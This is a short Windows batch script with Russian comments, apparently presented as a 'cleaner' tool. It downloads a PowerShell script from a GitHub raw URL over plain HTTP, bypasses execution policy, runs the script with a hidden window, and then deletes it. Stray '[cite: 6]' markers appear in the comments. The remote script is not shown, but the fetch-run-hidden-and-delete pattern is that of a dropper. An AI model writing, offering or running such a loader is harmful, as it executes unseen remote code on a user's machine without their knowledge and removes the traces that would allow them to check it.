@echo off
REM Меняем кодировку на UTF-8 для корректной работы[cite: 6]
chcp 65001 > nul
set "PS_FILE=%TEMP%\cleaner_ds_temp.ps1"

REM Скачиваем скрипт во временную папку[cite: 6]
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "[System.IO.File]::WriteAllText('%PS_FILE%', (Invoke-RestMethod -Uri 'http://raw.githubusercontent.com/cleands/cds/refs/heads/main/script.ps1'), [System.Text.Encoding]::UTF8)"

REM Запускаем скачанный скрипт в скрытом режиме[cite: 6]
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_FILE%"

REM Удаляем временный файл[cite: 6]
del /f /q "%PS_FILE%" > nul 2>&1
